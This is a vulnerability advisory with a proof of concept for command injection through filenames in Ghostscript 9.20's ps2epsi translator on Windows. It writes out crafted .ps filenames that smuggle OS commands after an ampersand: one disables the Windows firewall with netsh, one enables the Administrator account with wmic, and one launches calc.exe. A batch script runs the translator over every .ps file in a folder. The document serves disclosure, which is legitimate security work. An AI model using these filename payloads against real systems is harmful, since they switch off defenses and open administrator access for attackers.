Vendor:
===============
ghostscript.com



Product:
================
Ghostscript 9.20
gs920w32.exe
Windows (32 bit)
hash: fee2cc1b8b467888a4ed44dd9f4567ed


Ghostscript is a suite of software based Postscript and PDF
interpreter/renderers for file conversion.


Vulnerability Type:
==========================
Filename Command Execution



CVE Reference:
==============
N/A



Security Issue:
================
The ghostscript ps2epsi translator to processes ".ps" files executes
arbitrary commands from specially crafted filenames that contain
OS commands as part of the processed postscript files name. This feature
seems to work only using the ps2epsi translator.
Other tested GS translator calls like 'ps2pdf' fail.

c:\>ps2epsi
"Usage: ps2epsi <infile.ps> <outfile.epi>"

Example, take a file "POC&<SYSTEM-COMMAND>;1.ps", it will run arbitrary
Commands contained after the ampersand character "&".

If a user runs some automated script to call the ps2epsi translator to
process ".ps" files from a remote share or directory
where actual filename is unknown, it can potentially allow attackers to
execute arbitrary commands on victims machine.

Characters like "/", ":" are restricted in filenames, but we can abuse
Windows netsh and wmic to bypass some of these barriers.

Quick Ghostscript CL test.
Create file called Test&calc.exe;1.ps

ps2epsi "Test&calc.exe;1.ps"  outfile

BOOM! calc.exe runs...


Exploit/POC:
=============
Add Ghostscript lib 'c:\Program Files (x86)\gs\gs9.20\lib' to Windows
environmental Path, so we can easily call 'ps2epsi' GS CMD.

Create the following malicious ".ps" postscript files.

1) Turn of Windows Firewall
Test&netsh Advfirewall set allprofiles state off&;1.ps


2) Enable Windows Administrator account (using WMIC).
Test&wmic useraccount where name='administrator' set disabled='false'&;1.ps

If user don't have wmic on path, fix it for POC by set environmental system
variable.
Add "C:\Windows\system32\wbem;" to 'Path' variable.

Run below bat script to process bunch of *.ps" files.

"POC.bat"

@echo off
rem ghostscript Filename Command Execution POC
rem by hyp3rlinx

for %%1 in ("*.ps") do; ps2epsi  "%%1" "evil.ps"


Severity:
=========
Medium
